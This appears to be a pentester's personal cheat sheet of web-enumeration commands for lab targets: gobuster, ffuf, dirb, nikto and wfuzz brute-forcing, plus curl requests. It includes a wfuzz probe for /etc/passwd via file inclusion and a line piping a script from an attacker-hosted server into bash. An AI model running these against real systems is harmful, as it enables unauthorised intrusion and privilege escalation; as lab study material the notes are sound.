```
echo -ne "GET / HTTP/1.1\r\nHost: google.com\r\nConnection: close\r\n\r\n"
```

![](Pasted%20image%2020230923182239.png)

```
GET / HTTP/1.1\r\n
Host: google.com\r\n
Connection: close\r\n\r\n
```

```
\r (carriage return or 0x0d)
\n (new line or 0x0a)
```

```
nikto -h url
```

dirbuster
gobuster
feroxbuster

```
searchsploit mod ssl 2
```

```
dirb url
```

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u url/FUZZ
```

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://academy.htb/ -x .php, .txt -o gobuster-result.txt
```

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -u http://academy.htb -o gobuster-dir-root.log
```

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://academy.htb -o gobuster-vhost-sub.txt
```

```
grep \.git /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

![](Pasted%20image%2020231014122728.png)

```
curl -v 'url' -X POST --data '<key><value>>please</value></key>\n' -H 'Content-Type:application/xml'
```

```
curl -v 'url' -X POST --data '{"key": "please"}' -H 'Content-Type:application/json' --trace-ascii -
```

```
curl -v 'url' -X POST --data 'key: please' -H 'Content-Type:application/yaml' --trace-ascii -
```

```
curl attackerIP:8000/linpeas.sh | bash
```

```
python3 -m http.server
```

https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

### Directory & Files Bruteforce

*Filter by whitelisting codes*

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
```

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://vulnerable.site/FUZZ
```

